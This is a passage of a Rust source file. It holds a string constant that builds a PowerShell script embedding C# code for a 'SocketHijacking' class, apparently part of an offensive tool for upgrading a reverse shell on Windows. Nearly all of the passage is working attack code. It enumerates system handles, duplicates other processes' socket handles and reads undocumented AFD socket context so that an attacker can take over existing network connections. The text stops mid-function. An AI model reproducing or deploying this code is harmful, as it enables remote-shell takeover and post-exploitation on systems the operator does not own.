pub const WINDOWS_UPGRADE: &str = concat!(
	"$source += \"using System.Net;`n\"\n",
	"$source += \"using System.Net.Sockets;`n\"\n",
	"$source += \"using System.Net.NetworkInformation;`n\"\n",
	"$source += \"using System.Runtime.InteropServices;`n\"\n",
	"$source += \"using System.Diagnostics;`n\"\n",
	"$source += \"using System.Collections.Generic;`n\"\n",
	"$source += \"using System;`n\"\n",
	"$source += \"using System.IO;`n\"\n",
	"$source += \"using System.Text;`n\"\n",
	"$source += \"using System.Threading;`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"public class UpgradeShellException : Exception`n\"\n",
	"$source += \"{`n\"\n",
	"$source += \"    private const string error_string = `\"[-] UpgradeShellException: `\";`n\"\n",
	"$source += \"    public UpgradeShellException() { }`n\"\n",
	"$source += \"    public UpgradeShellException(string message) : base(error_string + message) { }`n\"\n",
	"$source += \"}`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"public class DeadlockCheckHelper`n\"\n",
	"$source += \"{`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private bool deadlockDetected;`n\"\n",
	"$source += \"    private IntPtr targetHandle;`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private delegate uint LPTHREAD_START_ROUTINE(uint lpParam);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"kernel32.dll`\")]`n\"\n",
	"$source += \"    private static extern bool CloseHandle(IntPtr hObject);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source += \"    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"Kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source += \"    private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private uint ThreadCheckDeadlock(uint threadParams)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        IntPtr objPtr = IntPtr.Zero;`n\"\n",
	"$source += \"        objPtr = SocketHijacking.NtQueryObjectDynamic(this.targetHandle, SocketHijacking.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);`n\"\n",
	"$source += \"        this.deadlockDetected = false;`n\"\n",
	"$source += \"        if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);`n\"\n",
	"$source += \"        return 0;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public bool CheckDeadlockDetected(IntPtr tHandle)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        this.deadlockDetected = true;`n\"\n",
	"$source += \"        this.targetHandle = tHandle;`n\"\n",
	"$source += \"        LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);`n\"\n",
	"$source += \"        IntPtr hThread = IntPtr.Zero;`n\"\n",
	"$source += \"        uint threadId = 0;`n\"\n",
	"$source += \"        //we need native threads, C# threads hang and go in lock. We need to avoids hangs on named pipe so... No hangs no deadlocks... no pain no gains...`n\"\n",
	"$source += \"        hThread = CreateThread(0, 0, delegateThreadCheckDeadlock, IntPtr.Zero, 0, out threadId);`n\"\n",
	"$source += \"        WaitForSingleObject(hThread, 1500);`n\"\n",
	"$source += \"        //we do not kill the `\"pending`\" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.`n\"\n",
	"$source += \"        //just some waste of threads :(`n\"\n",
	"$source += \"        CloseHandle(hThread);`n\"\n",
	"$source += \"        return this.deadlockDetected;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"}`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"public static class SocketHijacking`n\"\n",
	"$source += \"{`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private const uint NTSTATUS_SUCCESS = 0x00000000;`n\"\n",
	"$source += \"    private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;`n\"\n",
	"$source += \"    private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;`n\"\n",
	"$source += \"    private const uint NTSTATUS_BUFFERTOOSMALL = 0xc0000023;`n\"\n",
	"$source += \"    private const int NTSTATUS_PENDING = 0x00000103;`n\"\n",
	"$source += \"    private const int WSA_FLAG_OVERLAPPED = 0x1;`n\"\n",
	"$source += \"    private const int DUPLICATE_SAME_ACCESS = 0x2;`n\"\n",
	"$source += \"    private const int SystemHandleInformation = 16;`n\"\n",
	"$source += \"    private const int PROCESS_DUP_HANDLE = 0x0040;`n\"\n",
	"$source += \"    private const int SIO_TCP_INFO = unchecked((int)0xD8000027);`n\"\n",
	"$source += \"    private const int SG_UNCONSTRAINED_GROUP = 0x1;`n\"\n",
	"$source += \"    private const int SG_CONSTRAINED_GROUP = 0x2;`n\"\n",
	"$source += \"    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;`n\"\n",
	"$source += \"    private const int EVENT_ALL_ACCESS = 0x1f0003;`n\"\n",
	"$source += \"    private const int SynchronizationEvent = 1;`n\"\n",
	"$source += \"    private const UInt32 INFINITE = 0xFFFFFFFF;`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private enum SOCKET_STATE : uint`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        SocketOpen = 0,`n\"\n",
	"$source += \"        SocketBound = 1,`n\"\n",
	"$source += \"        SocketBoundUdp = 2,`n\"\n",
	"$source += \"        SocketConnected = 3,`n\"\n",
	"$source += \"        SocketClosed = 3`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private enum AFD_GROUP_TYPE : uint`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        GroupTypeNeither = 0,`n\"\n",
	"$source += \"        GroupTypeConstrained = SG_CONSTRAINED_GROUP,`n\"\n",
	"$source += \"        GroupTypeUnconstrained = SG_UNCONSTRAINED_GROUP`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public enum OBJECT_INFORMATION_CLASS : int`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        ObjectBasicInformation = 0,`n\"\n",
	"$source += \"        ObjectNameInformation = 1,`n\"\n",
	"$source += \"        ObjectTypeInformation = 2,`n\"\n",
	"$source += \"        ObjectAllTypesInformation = 3,`n\"\n",
	"$source += \"        ObjectHandleInformation = 4`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential, Pack = 1)]`n\"\n",
	"$source += \"    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public ushort UniqueProcessId;`n\"\n",
	"$source += \"        public ushort CreatorBackTraceIndex;`n\"\n",
	"$source += \"        public byte ObjectTypeIndex;`n\"\n",
	"$source += \"        public byte HandleAttributes;`n\"\n",
	"$source += \"        public ushort HandleValue;`n\"\n",
	"$source += \"        public IntPtr Object;`n\"\n",
	"$source += \"        public IntPtr GrantedAccess;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct GENERIC_MAPPING`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public int GenericRead;`n\"\n",
	"$source += \"        public int GenericWrite;`n\"\n",
	"$source += \"        public int GenericExecute;`n\"\n",
	"$source += \"        public int GenericAll;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential, Pack = 1)]`n\"\n",
	"$source += \"    private struct OBJECT_TYPE_INFORMATION_V2`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public UNICODE_STRING TypeName;`n\"\n",
	"$source += \"        public uint TotalNumberOfObjects;`n\"\n",
	"$source += \"        public uint TotalNumberOfHandles;`n\"\n",
	"$source += \"        public uint TotalPagedPoolUsage;`n\"\n",
	"$source += \"        public uint TotalNonPagedPoolUsage;`n\"\n",
	"$source += \"        public uint TotalNamePoolUsage;`n\"\n",
	"$source += \"        public uint TotalHandleTableUsage;`n\"\n",
	"$source += \"        public uint HighWaterNumberOfObjects;// PeakObjectCount;`n\"\n",
	"$source += \"        public uint HighWaterNumberOfHandles;// PeakHandleCount;`n\"\n",
	"$source += \"        public uint HighWaterPagedPoolUsage;`n\"\n",
	"$source += \"        public uint HighWaterNonPagedPoolUsage;`n\"\n",
	"$source += \"        public uint HighWaterNamePoolUsage;`n\"\n",
	"$source += \"        public uint HighWaterHandleTableUsage;`n\"\n",
	"$source += \"        public uint InvalidAttributes;`n\"\n",
	"$source += \"        public GENERIC_MAPPING GenericMapping;`n\"\n",
	"$source += \"        public uint ValidAccessMask;`n\"\n",
	"$source += \"        public byte SecurityRequired;//bool`n\"\n",
	"$source += \"        public byte MaintainHandleCount;//bool`n\"\n",
	"$source += \"        public byte TypeIndex;`n\"\n",
	"$source += \"        public byte ReservedByte;`n\"\n",
	"$source += \"        public uint PoolType;`n\"\n",
	"$source += \"        public uint DefaultPagedPoolCharge;// PagedPoolUsage;`n\"\n",
	"$source += \"        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential, Pack = 1)]`n\"\n",
	"$source += \"    private struct OBJECT_NAME_INFORMATION`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public UNICODE_STRING Name;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct UNICODE_STRING`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public ushort Length;`n\"\n",
	"$source += \"        public ushort MaximumLength;`n\"\n",
	"$source += \"        public IntPtr Buffer;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct WSAData`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public short wVersion;`n\"\n",
	"$source += \"        public short wHighVersion;`n\"\n",
	"$source += \"        public short iMaxSockets;`n\"\n",
	"$source += \"        public short iMaxUdpDg;`n\"\n",
	"$source += \"        public IntPtr lpVendorInfo;`n\"\n",
	"$source += \"        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]`n\"\n",
	"$source += \"        public string szDescription;`n\"\n",
	"$source += \"        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]`n\"\n",
	"$source += \"        public string szSystemStatus;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]`n\"\n",
	"$source += \"    private struct WSAPROTOCOLCHAIN`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public int ChainLen;`n\"\n",
	"$source += \"        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]`n\"\n",
	"$source += \"        public uint[] ChainEntries;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]`n\"\n",
	"$source += \"    private struct WSAPROTOCOL_INFO`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public uint dwServiceFlags1;`n\"\n",
	"$source += \"        public uint dwServiceFlags2;`n\"\n",
	"$source += \"        public uint dwServiceFlags3;`n\"\n",
	"$source += \"        public uint dwServiceFlags4;`n\"\n",
	"$source += \"        public uint dwProviderFlags;`n\"\n",
	"$source += \"        public Guid ProviderId;`n\"\n",
	"$source += \"        public uint dwCatalogEntryId;`n\"\n",
	"$source += \"        public WSAPROTOCOLCHAIN ProtocolChain;`n\"\n",
	"$source += \"        public int iVersion;`n\"\n",
	"$source += \"        public int iAddressFamily;`n\"\n",
	"$source += \"        public int iMaxSockAddr;`n\"\n",
	"$source += \"        public int iMinSockAddr;`n\"\n",
	"$source += \"        public int iSocketType;`n\"\n",
	"$source += \"        public int iProtocol;`n\"\n",
	"$source += \"        public int iProtocolMaxOffset;`n\"\n",
	"$source += \"        public int iNetworkByteOrder;`n\"\n",
	"$source += \"        public int iSecurityScheme;`n\"\n",
	"$source += \"        public uint dwMessageSize;`n\"\n",
	"$source += \"        public uint dwProviderReserved;`n\"\n",
	"$source += \"        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]`n\"\n",
	"$source += \"        public string szProtocol;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct SOCKADDR_IN`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public short sin_family;`n\"\n",
	"$source += \"        public short sin_port;`n\"\n",
	"$source += \"        public uint sin_addr;`n\"\n",
	"$source += \"        public long sin_zero;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct TCP_INFO_v0`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public TcpState State;`n\"\n",
	"$source += \"        public UInt32 Mss;`n\"\n",
	"$source += \"        public UInt64 ConnectionTimeMs;`n\"\n",
	"$source += \"        public byte TimestampsEnabled;`n\"\n",
	"$source += \"        public UInt32 RttUs;`n\"\n",
	"$source += \"        public UInt32 MinRttUs;`n\"\n",
	"$source += \"        public UInt32 BytesInFlight;`n\"\n",
	"$source += \"        public UInt32 Cwnd;`n\"\n",
	"$source += \"        public UInt32 SndWnd;`n\"\n",
	"$source += \"        public UInt32 RcvWnd;`n\"\n",
	"$source += \"        public UInt32 RcvBuf;`n\"\n",
	"$source += \"        public UInt64 BytesOut;`n\"\n",
	"$source += \"        public UInt64 BytesIn;`n\"\n",
	"$source += \"        public UInt32 BytesReordered;`n\"\n",
	"$source += \"        public UInt32 BytesRetrans;`n\"\n",
	"$source += \"        public UInt32 FastRetrans;`n\"\n",
	"$source += \"        public UInt32 DupAcksIn;`n\"\n",
	"$source += \"        public UInt32 TimeoutEpisodes;`n\"\n",
	"$source += \"        public byte SynRetrans;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct linger`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public UInt16 l_onoff;`n\"\n",
	"$source += \"        public UInt16 l_linger;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential, Pack = 0)]`n\"\n",
	"$source += \"    private struct IO_STATUS_BLOCK`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public int status;`n\"\n",
	"$source += \"        public IntPtr information;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct SOCK_SHARED_INFO`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public SOCKET_STATE State;`n\"\n",
	"$source += \"        public Int32 AddressFamily;`n\"\n",
	"$source += \"        public Int32 SocketType;`n\"\n",
	"$source += \"        public Int32 Protocol;`n\"\n",
	"$source += \"        public Int32 LocalAddressLength;`n\"\n",
	"$source += \"        public Int32 RemoteAddressLength;`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"        // Socket options controlled by getsockopt(), setsockopt().`n\"\n",
	"$source += \"        public linger LingerInfo;`n\"\n",
	"$source += \"        public UInt32 SendTimeout;`n\"\n",
	"$source += \"        public UInt32 ReceiveTimeout;`n\"\n",
	"$source += \"        public UInt32 ReceiveBufferSize;`n\"\n",
	"$source += \"        public UInt32 SendBufferSize;`n\"\n",
	"$source += \"        /* Those are the bits in the SocketProerty, proper order:`n\"\n",
	"$source += \"            Listening;`n\"\n",
	"$source += \"            Broadcast;`n\"\n",
	"$source += \"            Debug;`n\"\n",
	"$source += \"            OobInline;`n\"\n",
	"$source += \"            ReuseAddresses;`n\"\n",
	"$source += \"            ExclusiveAddressUse;`n\"\n",
	"$source += \"            NonBlocking;`n\"\n",
	"$source += \"            DontUseWildcard;`n\"\n",
	"$source += \"            ReceiveShutdown;`n\"\n",
	"$source += \"            SendShutdown;`n\"\n",
	"$source += \"            ConditionalAccept;`n\"\n",
	"$source += \"        */`n\"\n",
	"$source += \"        public ushort SocketProperty;`n\"\n",
	"$source += \"        // Snapshot of several parameters passed into WSPSocket() when creating this socket`n\"\n",
	"$source += \"        public UInt32 CreationFlags;`n\"\n",
	"$source += \"        public UInt32 CatalogEntryId;`n\"\n",
	"$source += \"        public UInt32 ServiceFlags1;`n\"\n",
	"$source += \"        public UInt32 ProviderFlags;`n\"\n",
	"$source += \"        public UInt32 GroupID;`n\"\n",
	"$source += \"        public AFD_GROUP_TYPE GroupType;`n\"\n",
	"$source += \"        public Int32 GroupPriority;`n\"\n",
	"$source += \"        // Last error set on this socket`n\"\n",
	"$source += \"        public Int32 LastError;`n\"\n",
	"$source += \"        // Info stored for WSAAsyncSelect()`n\"\n",
	"$source += \"        public IntPtr AsyncSelecthWnd;`n\"\n",
	"$source += \"        public UInt32 AsyncSelectSerialNumber;`n\"\n",
	"$source += \"        public UInt32 AsyncSelectwMsg;`n\"\n",
	"$source += \"        public Int32 AsyncSelectlEvent;`n\"\n",
	"$source += \"        public Int32 DisabledAsyncSelectEvents;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct SOCKADDR`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public UInt16 sa_family;`n\"\n",
	"$source += \"        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 14)]`n\"\n",
	"$source += \"        public byte[] sa_data;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"    private struct SOCKET_CONTEXT`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public SOCK_SHARED_INFO SharedData;`n\"\n",
	"$source += \"        public UInt32 SizeOfHelperData;`n\"\n",
	"$source += \"        public UInt32 Padding;`n\"\n",
	"$source += \"        public SOCKADDR LocalAddress;`n\"\n",
	"$source += \"        public SOCKADDR RemoteAddress;`n\"\n",
	"$source += \"        // Helper Data - found out with some reversing`n\"\n",
	"$source += \"        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]`n\"\n",
	"$source += \"        public byte[] HelperData;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private struct SOCKET_BYTESIN`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        public IntPtr handle;`n\"\n",
	"$source += \"        public UInt64 BytesIn;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"WS2_32.DLL`\", CharSet = CharSet.Auto, SetLastError = true)]`n\"\n",
	"$source += \"    private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]`n\"\n",
	"$source += \"    private static extern IntPtr WSASocket([In] int addressFamily, [In] int socketType, [In] int protocolType, ref WSAPROTOCOL_INFO lpProtocolInfo, Int32 group1, int dwFlags);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Auto)]`n\"\n",
	"$source += \"    private static extern Int32 WSAGetLastError();`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]`n\"\n",
	"$source += \"    private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    // WSAIoctl1 implementation specific for SIO_TCP_INFO control code`n\"\n",
	"$source += \"    [DllImport(`\"Ws2_32.dll`\", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = `\"WSAIoctl`\")]`n\"\n",
	"$source += \"    public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"ws2_32.dll`\", CharSet = CharSet.Unicode, SetLastError = true)]`n\"\n",
	"$source += \"    private static extern int closesocket(IntPtr s);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source += \"    private static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source += \"    [return: MarshalAs(UnmanagedType.Bool)]`n\"\n",
	"$source += \"    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"kernel32.dll`\")]`n\"\n",
	"$source += \"    private static extern bool CloseHandle(IntPtr hObject);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"kernel32.dll`\")]`n\"\n",
	"$source += \"    private static extern IntPtr GetCurrentProcess();`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"ntdll.dll`\")]`n\"\n",
	"$source += \"    private static extern uint NtQueryObject(IntPtr objectHandle, OBJECT_INFORMATION_CLASS informationClass, IntPtr informationPtr, uint informationLength, ref int returnLength);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"ntdll.dll`\")]`n\"\n",
	"$source += \"    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source += \"    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"ntdll.dll`\")]`n\"\n",
	"$source += \"    private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode`n\"\n",
	"$source += \"    [DllImport(`\"ntdll.dll`\", EntryPoint = `\"NtDeviceIoControlFile`\")]`n\"\n",
	"$source += \"    private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"Ws2_32.dll`\")]`n\"\n",
	"$source += \"    public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);`n\"\n",
	"    $source += \"`n\"\n",
	"$source += \"    //helper method with `\"dynamic`\" buffer allocation`n\"\n",
	"$source += \"    private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        if (infoLength == 0)`n\"\n",
	"$source += \"            infoLength = 0x10000;`n\"\n",
	"$source += \"        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);`n\"\n",
	"$source += \"        while (true)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            uint result = (uint)NtQuerySystemInformation(infoClass, infoPtr, infoLength, ref infoLength);`n\"\n",
	"$source += \"            infoLength = infoLength * 2;`n\"\n",
	"$source += \"            if (result == NTSTATUS_SUCCESS)`n\"\n",
	"$source += \"                return infoPtr;`n\"\n",
	"$source += \"            Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful`n\"\n",
	"$source += \"            if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                //throw new Exception(`\"Unhandled NtStatus `\" + result);`n\"\n",
	"$source += \"                return IntPtr.Zero;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"            infoPtr = Marshal.AllocHGlobal(infoLength);`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private static IntPtr QueryObjectTypesInfo()`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        IntPtr ptrObjectTypesInformation = IntPtr.Zero;`n\"\n",
	"$source += \"        ptrObjectTypesInformation = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);`n\"\n",
	"$source += \"        return ptrObjectTypesInformation;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h`n\"\n",
	"$source += \"    private static long AlignUp(long address, long align)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        return (((address) + (align) - 1) & ~((align) - 1));`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) `\"way`\" of counting index types.`n\"\n",
	"$source += \"    // credits for this goes to @0xrepnz`n\"\n",
	"$source += \"    // more information here --> https://twitter.com/splinter_code/status/1400873009121013765`n\"\n",
	"$source += \"    private static byte GetTypeIndexByName(string ObjectName)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        byte TypeIndex = 0;`n\"\n",
	"$source += \"        long TypesCount = 0;`n\"\n",
	"$source += \"        IntPtr ptrTypesInfo = IntPtr.Zero;`n\"\n",
	"$source += \"        ptrTypesInfo = QueryObjectTypesInfo();`n\"\n",
	"$source += \"        TypesCount = Marshal.ReadIntPtr(ptrTypesInfo).ToInt64();`n\"\n",
	"$source += \"        // create a pointer to the first element address of OBJECT_TYPE_INFORMATION_V2`n\"\n",
	"$source += \"        IntPtr ptrTypesInfoCurrent = new IntPtr(ptrTypesInfo.ToInt64() + IntPtr.Size);`n\"\n",
	"$source += \"        for (int i = 0; i < TypesCount; i++)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));`n\"\n",
	"$source += \"            // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object`n\"\n",
	"$source += \"            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));`n\"\n",
	"$source += \"            if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                TypeIndex = Type.TypeIndex;`n\"\n",
	"$source += \"                break;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        Marshal.FreeHGlobal(ptrTypesInfo);`n\"\n",
	"$source += \"        return TypeIndex;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private static List<IntPtr> DuplicateSocketsFromHandles(List<IntPtr> sockets)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        List<IntPtr> dupedSocketsOut = new List<IntPtr>();`n\"\n",
	"$source += \"        if (sockets.Count < 1) return dupedSocketsOut;`n\"\n",
	"$source += \"        foreach (IntPtr sock in sockets)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            IntPtr dupedSocket = DuplicateSocketFromHandle(sock);`n\"\n",
	"$source += \"            if (dupedSocket != IntPtr.Zero) dupedSocketsOut.Add(dupedSocket);`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        // cleaning all socket handles`n\"\n",
	"$source += \"        foreach (IntPtr sock in sockets)`n\"\n",
	"$source += \"            CloseHandle(sock);`n\"\n",
	"$source += \"        return dupedSocketsOut;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> sockets)`n\"\n",
	"$source += \"    {`n\"\n",
